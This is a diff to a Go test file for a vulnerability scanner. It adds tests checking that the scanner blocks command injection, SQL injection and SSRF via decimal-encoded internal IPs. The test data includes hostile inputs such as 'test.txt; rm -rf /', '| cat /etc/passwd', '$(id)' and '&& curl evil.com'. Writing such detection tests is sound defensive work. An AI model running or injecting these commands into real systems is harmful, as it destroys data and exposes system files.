@@ -1,6 +1,7 @@
 package scanner
 
 import (
+	"strings"
 	"testing"
 )
 
@@ -324,11 +325,11 @@ func TestIsDecimalIP(t *testing.T) {
 		host string
 		want bool
 	}{
-		{"2130706433", true},  // 127.0.0.1
-		{"3232235521", true},  // 192.168.0.1
-		{"65535", false},      // Could be a port
+		{"2130706433", true}, // 127.0.0.1
+		{"3232235521", true}, // 192.168.0.1
+		{"65535", false},     // Could be a port
 		{"example.com", false},
-		{"127.0.0.1", false},  // Dotted notation, not decimal
+		{"127.0.0.1", false}, // Dotted notation, not decimal
 		{"", false},
 	}
 
@@ -337,6 +338,94 @@ func TestIsDecimalIP(t *testing.T) {
 			got := isDecimalIP(tt.host)
 			if got != tt.want {
 				t.Errorf("isDecimalIP(%q) = %v, want %v", tt.host, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestVulnScanner_CommandInjection_Extended(t *testing.T) {
+	s := NewVulnScanner(&VulnScanConfig{
+		Enabled: true,
+		Rules:   []string{"command_injection"},
+	})
+
+	tests := []struct {
+		name    string
+		params  string
+		blocked bool
+	}{
+		// Additional true positives
+		{"semicolon rm -rf", "test.txt; rm -rf /", true},
+		{"pipe cat /etc/passwd", "| cat /etc/passwd", true},
+		{"backtick whoami", "`whoami`", true},
+		{"dollar paren id", "$(id)", true},
+		{"ampersand curl evil", "&& curl evil.com", true},
+
+		// True negatives
+		{"echo hello", "echo hello", false},
+		{"normal text", "normal text without commands", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			blocked, reason := s.Scan("system.exec", tt.params)
+			if blocked != tt.blocked {
+				t.Errorf("Scan(%q) = blocked:%v, want:%v (reason: %s)", tt.params, blocked, tt.blocked, reason)
+			}
+		})
+	}
+}
+
+func TestVulnScanner_EmptyAndEdgeCases(t *testing.T) {
+	s := NewVulnScanner(&VulnScanConfig{Enabled: true})
+
+	tests := []struct {
+		name    string
+		method  string
+		args    string
+		blocked bool
+	}{
+		// Edge cases
+		{"empty method string", "", "SELECT * FROM users WHERE id = 1 OR 1=1", true},
+		{"valid method empty args", "db.query", "", false},
+		{"very long input string", "db.query", "SELECT " + strings.Repeat("a", 10000), false},
+		{"unicode in args", "web.fetch", "url http://example.com/éàü", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			blocked, reason := s.Scan(tt.method, tt.args)
+			if blocked != tt.blocked {
+				t.Errorf("Scan(%q, %q) = blocked:%v, want:%v (reason: %s)", tt.method, tt.args, blocked, tt.blocked, reason)
+			}
+		})
+	}
+}
+
+func TestVulnScanner_SSRF_DecimalIP(t *testing.T) {
+	s := NewVulnScanner(&VulnScanConfig{
+		Enabled: true,
+		Rules:   []string{"ssrf"},
+	})
+
+	tests := []struct {
+		name    string
+		params  string
+		blocked bool
+	}{
+		// Decimal IP addresses
+		{"decimal 127.0.0.1", "http://2130706433/", true},
+		{"decimal 192.168.1.1", "http://3232235777/", true},
+
+		// Public URLs should not be blocked
+		{"public URL", "http://example.com", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			blocked, reason := s.Scan("web.fetch", tt.params)
+			if blocked != tt.blocked {
+				t.Errorf("Scan(%q) = blocked:%v, want:%v (reason: %s)", tt.params, blocked, tt.blocked, reason)
 			}
 		})
 	}
